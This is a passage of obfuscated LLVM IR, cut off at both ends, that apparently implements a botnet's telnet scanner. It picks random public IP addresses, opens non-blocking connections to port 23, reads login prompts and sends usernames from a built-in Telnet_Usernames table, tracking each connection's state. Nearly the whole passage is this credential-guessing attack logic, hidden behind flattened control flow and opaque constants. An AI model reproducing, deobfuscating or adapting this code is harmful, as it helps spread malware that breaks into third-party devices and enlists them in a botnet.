  %.reload200 = load volatile i32, i32* %.reg2mem190
  %Pivot8 = icmp slt i32 %.reload200, 7
  %118 = select i1 %Pivot8, i32 1378450891, i32 1171358090
  store i32 %118, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload201 = load volatile i32, i32* %.reg2mem190
  %Pivot6 = icmp slt i32 %.reload201, 5
  %119 = select i1 %Pivot6, i32 -621158105, i32 -1334845598
  store i32 %119, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload206 = load volatile i32, i32* %.reg2mem190
  %Pivot4 = icmp slt i32 %.reload206, 2
  %120 = select i1 %Pivot4, i32 1674270055, i32 9241888
  store i32 %120, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload203 = load volatile i32, i32* %.reg2mem190
  %Pivot2 = icmp slt i32 %.reload203, 3
  %121 = select i1 %Pivot2, i32 1125194645, i32 327094014
  store i32 %121, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload205 = load volatile i32, i32* %.reg2mem190
  %Pivot = icmp slt i32 %.reload205, 1
  %122 = select i1 %Pivot, i32 2045683805, i32 -405946034
  store i32 %122, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload204 = load volatile i32, i32* %.reg2mem190
  %SwitchLeaf = icmp eq i32 %.reload204, 0
  %123 = select i1 %SwitchLeaf, i32 -887944323, i32 -1177065359
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i32, i32* %6, align 4
  %126 = sext i32 %125 to i64
  %.reload182 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload182, i64 %126
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %127, i32 0, i32 3
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 1
  %132 = select i1 %131, i32 785821625, i32 574257811
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i32, i32* %6, align 4
  %135 = sext i32 %134 to i64
  %.reload181 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload181, i64 %135
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %136, i32 0, i32 9
  %138 = load i8*, i8** %137, align 8
  store i8* %138, i8** %20, align 8
  %139 = load i32, i32* %6, align 4
  %140 = sext i32 %139 to i64
  %.reload180 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload180, i64 %140
  %142 = bitcast %struct.telstate_t* %141 to i8*
  call void @llvm.memset.p0i8.i64(i8* %142, i8 0, i64 32, i32 16, i1 false)
  %143 = load i8*, i8** %20, align 8
  %144 = load i32, i32* %6, align 4
  %145 = sext i32 %144 to i64
  %.reload179 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload179, i64 %145
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %146, i32 0, i32 9
  store i8* %143, i8** %147, align 8
  %148 = call i32 @getRandomPublicIP()
  %149 = load i32, i32* %6, align 4
  %150 = sext i32 %149 to i64
  %.reload178 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload178, i64 %150
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %151, i32 0, i32 1
  store i32 %148, i32* %152, align 4
  store i32 1519751982, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load i32, i32* %6, align 4
  %155 = sext i32 %154 to i64
  %.reload177 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload177, i64 %155
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %156, i32 0, i32 3
  %158 = load i8, i8* %157, align 1
  %159 = zext i8 %158 to i32
  %160 = icmp eq i32 %159, 0
  %161 = select i1 %160, i32 -297178895, i32 -1066200633
  store i32 %161, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i32, i32* %6, align 4
  %164 = sext i32 %163 to i64
  %.reload176 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload176, i64 %164
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %165, i32 0, i32 4
  %167 = load i8, i8* %166, align 2
  %168 = add i8 %167, 1
  store i8 %168, i8* %166, align 2
  %169 = load i32, i32* %6, align 4
  %170 = sext i32 %169 to i64
  %.reload175 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload175, i64 %170
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %171, i32 0, i32 5
  %173 = load i8, i8* %172, align 1
  %174 = add i8 %173, 1
  store i8 %174, i8* %172, align 1
  %175 = load i32, i32* %6, align 4
  %176 = sext i32 %175 to i64
  %.reload174 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload174, i64 %176
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %177, i32 0, i32 5
  %179 = load i8, i8* %178, align 1
  %180 = zext i8 %179 to i64
  %181 = icmp eq i64 %180, 19
  %182 = select i1 %181, i32 -1642960820, i32 974140043
  store i32 %182, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i32, i32* %6, align 4
  %185 = sext i32 %184 to i64
  %.reload173 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload173, i64 %185
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %186, i32 0, i32 3
  store i8 1, i8* %187, align 1
  store i32 -232975211, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i32, i32* %6, align 4
  %190 = sext i32 %189 to i64
  %.reload172 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload172, i64 %190
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %191, i32 0, i32 4
  %193 = load i8, i8* %192, align 2
  %194 = zext i8 %193 to i64
  %195 = icmp eq i64 %194, 19
  %196 = select i1 %195, i32 -921083237, i32 -2008401222
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i32, i32* %6, align 4
  %199 = sext i32 %198 to i64
  %.reload171 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload171, i64 %199
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %200, i32 0, i32 3
  store i8 1, i8* %201, align 1
  store i32 -232975211, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  store i32 -1066200633, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  store i32 1519751982, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  %205 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %205, align 4
  %206 = call zeroext i16 @htons(i16 zeroext 23) #10
  %207 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %206, i16* %207, align 2
  %208 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %209 = getelementptr inbounds [8 x i8], [8 x i8]* %208, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %209, i8 0, i64 8, i32 4, i1 false)
  %210 = load i32, i32* %6, align 4
  %211 = sext i32 %210 to i64
  %.reload170 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload170, i64 %211
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %212, i32 0, i32 1
  %214 = load i32, i32* %213, align 4
  %215 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %216 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %215, i32 0, i32 0
  store i32 %214, i32* %216, align 4
  %217 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %218 = load i32, i32* %6, align 4
  %219 = sext i32 %218 to i64
  %.reload169 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload169, i64 %219
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %220, i32 0, i32 0
  store i32 %217, i32* %221, align 16
  %222 = load i32, i32* %6, align 4
  %223 = sext i32 %222 to i64
  %.reload168 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload168, i64 %223
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %224, i32 0, i32 0
  %226 = load i32, i32* %225, align 16
  %227 = icmp eq i32 %226, -1
  %228 = select i1 %227, i32 204752930, i32 -214369966
  store i32 %228, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  store i32 -232975211, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  %231 = load i32, i32* %6, align 4
  %232 = sext i32 %231 to i64
  %.reload167 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload167, i64 %232
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %233, i32 0, i32 0
  %235 = load i32, i32* %234, align 16
  %236 = load i32, i32* %6, align 4
  %237 = sext i32 %236 to i64
  %.reload166 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload166, i64 %237
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %238, i32 0, i32 0
  %240 = load i32, i32* %239, align 16
  %241 = call i32 (i32, i32, ...) @fcntl(i32 %240, i32 3, i8* null)
  %242 = or i32 %241, 2048
  %243 = call i32 (i32, i32, ...) @fcntl(i32 %235, i32 4, i32 %242)
  %244 = load i32, i32* %6, align 4
  %245 = sext i32 %244 to i64
  %.reload165 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload165, i64 %245
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %246, i32 0, i32 0
  %248 = load i32, i32* %247, align 16
  %249 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %250 = call i32 @connect(i32 %248, %struct.sockaddr* %249, i32 16)
  %251 = icmp eq i32 %250, -1
  %252 = select i1 %251, i32 -306146861, i32 -1352328780
  store i32 %252, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = call i32* @__errno_location() #10
  %255 = load i32, i32* %254, align 4
  %256 = icmp ne i32 %255, 115
  %257 = select i1 %256, i32 -11375539, i32 -1352328780
  store i32 %257, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = load i32, i32* %6, align 4
  %260 = sext i32 %259 to i64
  %.reload164 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload164, i64 %260
  call void @reset_telstate(%struct.telstate_t* %261)
  store i32 -1158917165, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = load i32, i32* %6, align 4
  %264 = sext i32 %263 to i64
  %.reload163 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload163, i64 %264
  call void @advance_telstate(%struct.telstate_t* %265, i32 1)
  store i32 -1158917165, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  store i32 1726154473, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  store i32 -1055218933, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %269 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %270 = getelementptr inbounds [16 x i64], [16 x i64]* %269, i64 0, i64 0
  %271 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %270) #5, !srcloc !5
  %272 = extractvalue { i64, i64* } %271, 0
  %273 = extractvalue { i64, i64* } %271, 1
  %274 = trunc i64 %272 to i32
  store i32 %274, i32* %21, align 4
  %275 = ptrtoint i64* %273 to i64
  %276 = trunc i64 %275 to i32
  store i32 %276, i32* %22, align 4
  store i32 35184764, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  store i32 -77496829, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i32, i32* %6, align 4
  %280 = sext i32 %279 to i64
  %.reload162 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload162, i64 %280
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %281, i32 0, i32 0
  %283 = load i32, i32* %282, align 16
  %284 = srem i32 %283, 64
  %285 = zext i32 %284 to i64
  %286 = shl i64 1, %285
  %287 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %288 = load i32, i32* %6, align 4
  %289 = sext i32 %288 to i64
  %.reload161 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload161, i64 %289
  %291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %290, i32 0, i32 0
  %292 = load i32, i32* %291, align 16
  %293 = sdiv i32 %292, 64
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds [16 x i64], [16 x i64]* %287, i64 0, i64 %294
  %296 = load i64, i64* %295, align 8
  %297 = or i64 %296, %286
  store i64 %297, i64* %295, align 8
  %298 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %298, align 8
  %299 = load i32, i32* %3, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %300, i64* %301, align 8
  %302 = load i32, i32* %6, align 4
  %303 = sext i32 %302 to i64
  %.reload160 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload160, i64 %303
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %304, i32 0, i32 0
  %306 = load i32, i32* %305, align 16
  %307 = add nsw i32 %306, 1
  %308 = call i32 @select(i32 %307, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %308, i32* %7, align 4
  %309 = load i32, i32* %7, align 4
  %310 = icmp eq i32 %309, 1
  %311 = select i1 %310, i32 -1572727654, i32 90198340
  store i32 %311, i32* %switchVar
  br label %loopEnd

; <label>:312:                                    ; preds = %loopEntry
  %313 = load i32, i32* %6, align 4
  %314 = sext i32 %313 to i64
  %.reload159 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload159, i64 %314
  %316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %315, i32 0, i32 7
  store i32 0, i32* %316, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %317 = load i32, i32* %6, align 4
  %318 = sext i32 %317 to i64
  %.reload158 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload158, i64 %318
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %319, i32 0, i32 0
  %321 = load i32, i32* %320, align 16
  %322 = bitcast i32* %15 to i8*
  %323 = call i32 @getsockopt(i32 %321, i32 1, i32 4, i8* %322, i32* %14) #5
  %324 = load i32, i32* %15, align 4
  %325 = icmp ne i32 %324, 0
  %326 = select i1 %325, i32 -414576603, i32 1327362191
  store i32 %326, i32* %switchVar
  br label %loopEnd

; <label>:327:                                    ; preds = %loopEntry
  %328 = load i32, i32* %6, align 4
  %329 = sext i32 %328 to i64
  %.reload157 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload157, i64 %329
  call void @reset_telstate(%struct.telstate_t* %330)
  store i32 633652167, i32* %switchVar
  br label %loopEnd

; <label>:331:                                    ; preds = %loopEntry
  %332 = load i32, i32* %6, align 4
  %333 = sext i32 %332 to i64
  %.reload156 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload156, i64 %333
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %334, i32 0, i32 0
  %336 = load i32, i32* %335, align 16
  %337 = load i32, i32* %6, align 4
  %338 = sext i32 %337 to i64
  %.reload155 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload155, i64 %338
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %339, i32 0, i32 0
  %341 = load i32, i32* %340, align 16
  %342 = call i32 (i32, i32, ...) @fcntl(i32 %341, i32 3, i8* null)
  %343 = and i32 %342, -2049
  %344 = call i32 (i32, i32, ...) @fcntl(i32 %336, i32 4, i32 %343)
  %345 = load i32, i32* %6, align 4
  %346 = sext i32 %345 to i64
  %.reload154 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload154, i64 %346
  call void @advance_telstate(%struct.telstate_t* %347, i32 2)
  store i32 633652167, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  store i32 -232975211, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i32, i32* %7, align 4
  %351 = icmp eq i32 %350, -1
  %352 = select i1 %351, i32 -1984560745, i32 1773870883
  store i32 %352, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  %354 = load i32, i32* %6, align 4
  %355 = sext i32 %354 to i64
  %.reload153 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload153, i64 %355
  call void @reset_telstate(%struct.telstate_t* %356)
  store i32 -232975211, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  store i32 1933521241, i32* %switchVar
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  %359 = load i32, i32* %6, align 4
  %360 = sext i32 %359 to i64
  %.reload152 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload152, i64 %360
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %361, i32 0, i32 7
  %363 = load i32, i32* %362, align 16
  %364 = add i32 %363, 7
  %365 = zext i32 %364 to i64
  %366 = call i64 @time(i64* null) #5
  %367 = icmp slt i64 %365, %366
  %368 = select i1 %367, i32 413393032, i32 1367191950
  store i32 %368, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = load i32, i32* %6, align 4
  %371 = sext i32 %370 to i64
  %.reload151 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload151, i64 %371
  call void @reset_telstate(%struct.telstate_t* %372)
  store i32 1367191950, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  store i32 1726154473, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  %375 = load i32, i32* %6, align 4
  %376 = sext i32 %375 to i64
  %.reload150 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload150, i64 %376
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %377, i32 0, i32 0
  %379 = load i32, i32* %378, align 16
  %380 = load i32, i32* %3, align 4
  %381 = load i32, i32* %6, align 4
  %382 = sext i32 %381 to i64
  %.reload149 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload149, i64 %382
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %383, i32 0, i32 9
  %385 = load i8*, i8** %384, align 8
  %386 = call i32 @read_until_response(i32 %379, i32 %380, i8* %385, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i32 0, i32 0))
  %387 = icmp ne i32 %386, 0
  %388 = select i1 %387, i32 77568242, i32 1261130615
  store i32 %388, i32* %switchVar
  br label %loopEnd

; <label>:389:                                    ; preds = %loopEntry
  %390 = call i64 @time(i64* null) #5
  %391 = trunc i64 %390 to i32
  %392 = load i32, i32* %6, align 4
  %393 = sext i32 %392 to i64
  %.reload148 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload148, i64 %393
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %394, i32 0, i32 7
  store i32 %391, i32* %395, align 16
  %396 = load i32, i32* %6, align 4
  %397 = sext i32 %396 to i64
  %.reload147 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload147, i64 %397
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %398, i32 0, i32 9
  %400 = load i8*, i8** %399, align 8
  %401 = call i32 @contains_fail(i8* %400)
  %402 = icmp ne i32 %401, 0
  %403 = select i1 %402, i32 -1572068152, i32 950640803
  store i32 %403, i32* %switchVar
  br label %loopEnd

; <label>:404:                                    ; preds = %loopEntry
  %405 = load i32, i32* %6, align 4
  %406 = sext i32 %405 to i64
  %.reload146 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload146, i64 %406
  call void @advance_telstate(%struct.telstate_t* %407, i32 0)
  store i32 1180739052, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  %409 = load i32, i32* %6, align 4
  %410 = sext i32 %409 to i64
  %.reload145 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload145, i64 %410
  call void @advance_telstate(%struct.telstate_t* %411, i32 3)
  store i32 1180739052, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  store i32 -232975211, i32* %switchVar
  br label %loopEnd

; <label>:413:                                    ; preds = %loopEntry
  %414 = load i32, i32* %6, align 4
  %415 = sext i32 %414 to i64
  %.reload144 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload144, i64 %415
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %416, i32 0, i32 7
  %418 = load i32, i32* %417, align 16
  %419 = add i32 %418, 7
  %420 = zext i32 %419 to i64
  %421 = call i64 @time(i64* null) #5
  %422 = icmp slt i64 %420, %421
  %423 = select i1 %422, i32 -495101985, i32 1192603993
  store i32 %423, i32* %switchVar
  br label %loopEnd

; <label>:424:                                    ; preds = %loopEntry
  %425 = load i32, i32* %6, align 4
  %426 = sext i32 %425 to i64
  %.reload143 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload143, i64 %426
  call void @reset_telstate(%struct.telstate_t* %427)
  store i32 1192603993, i32* %switchVar
  br label %loopEnd

; <label>:428:                                    ; preds = %loopEntry
  store i32 1726154473, i32* %switchVar
  br label %loopEnd

; <label>:429:                                    ; preds = %loopEntry
  %430 = load i32, i32* %6, align 4
  %431 = sext i32 %430 to i64
  %.reload142 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload142, i64 %431
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %432, i32 0, i32 0
  %434 = load i32, i32* %433, align 16
  %435 = load i32, i32* %6, align 4
  %436 = sext i32 %435 to i64
  %.reload141 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload141, i64 %436
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %437, i32 0, i32 4
  %439 = load i8, i8* %438, align 2
  %440 = zext i8 %439 to i64
  %441 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %440
  %442 = load i8*, i8** %441, align 8
  %443 = call i32 (i32, i8*, ...) @sockprintf(i32 %434, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.276, i32 0, i32 0), i8* %442)
  %444 = icmp slt i32 %443, 0
  %445 = select i1 %444, i32 159083318, i32 98007736
  store i32 %445, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  %447 = load i32, i32* %6, align 4
  %448 = sext i32 %447 to i64
  %.reload140 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload140, i64 %448
  call void @reset_telstate(%struct.telstate_t* %449)
  store i32 -232975211, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  %451 = load i32, i32* %6, align 4
  %452 = sext i32 %451 to i64
  %.reload139 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload139, i64 %452
  call void @advance_telstate(%struct.telstate_t* %453, i32 4)
  store i32 1726154473, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  %455 = load i32, i32* %6, align 4
  %456 = sext i32 %455 to i64
  %.reload138 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload138, i64 %456
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %457, i32 0, i32 0
  %459 = load i32, i32* %458, align 16
  %460 = load i32, i32* %3, align 4
  %461 = load i32, i32* %6, align 4
  %462 = sext i32 %461 to i64
  %.reload137 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload137, i64 %462
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %463, i32 0, i32 9
  %465 = load i8*, i8** %464, align 8
  %466 = call i32 @read_until_response(i32 %459, i32 %460, i8* %465, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i32 0, i32 0))
  %467 = icmp ne i32 %466, 0
  %468 = select i1 %467, i32 1323748249, i32 -1335928202
  store i32 %468, i32* %switchVar
  br label %loopEnd

; <label>:469:                                    ; preds = %loopEntry
  %470 = call i64 @time(i64* null) #5
  %471 = trunc i64 %470 to i32
  %472 = load i32, i32* %6, align 4
  %473 = sext i32 %472 to i64
  %.reload136 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload136, i64 %473
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %474, i32 0, i32 7
  store i32 %471, i32* %475, align 16
  %476 = load i32, i32* %6, align 4
  %477 = sext i32 %476 to i64
  %.reload135 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload135, i64 %477
  %479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %478, i32 0, i32 9
  %480 = load i8*, i8** %479, align 8
  %481 = call i32 @contains_fail(i8* %480)
  %482 = icmp ne i32 %481, 0
  %483 = select i1 %482, i32 -711778360, i32 230017706
  store i32 %483, i32* %switchVar
  br label %loopEnd

; <label>:484:                                    ; preds = %loopEntry
